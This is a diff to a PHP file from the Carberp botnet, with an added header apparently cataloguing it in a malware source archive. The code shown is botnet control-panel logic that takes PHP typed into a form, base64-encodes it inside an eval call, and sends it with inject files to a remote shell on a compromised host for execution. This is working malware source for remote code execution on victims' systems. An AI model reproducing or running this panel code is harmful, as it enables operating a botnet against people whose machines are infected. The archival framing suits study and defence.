@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $smarty->assign('rand_name', mt_rand(0000000000, 9999999999));
@@ -10,7 +21,8 @@ if(!empty($Cur['id'])){
 		$get_php .= file_get_contents('modules/admins/injects/start.php');
 		$get_php .= file_get_contents('modules/admins/injects/functions.php');
 		$get_php .= file_get_contents('modules/admins/injects/mysqli.php');
-		if(isset($_POST['submit']) && !empty($_POST['phpeval'])){			//$get_php .= 'eval(\'base64_decode(\''.base64_encode($_POST['phpeval']).'\')\');';
+		if(isset($_POST['submit']) && !empty($_POST['phpeval'])){
+			//$get_php .= 'eval(\'base64_decode(\''.base64_encode($_POST['phpeval']).'\')\');';
 			$get_php .= 'eval(base64_decode(\''.base64_encode(''.$_POST['phpeval'].'').'\'));';
 			$eval = get_http($result->link, $get_php, $result->keyid, $result->shell);
 			$smarty->assign('eval', $eval);
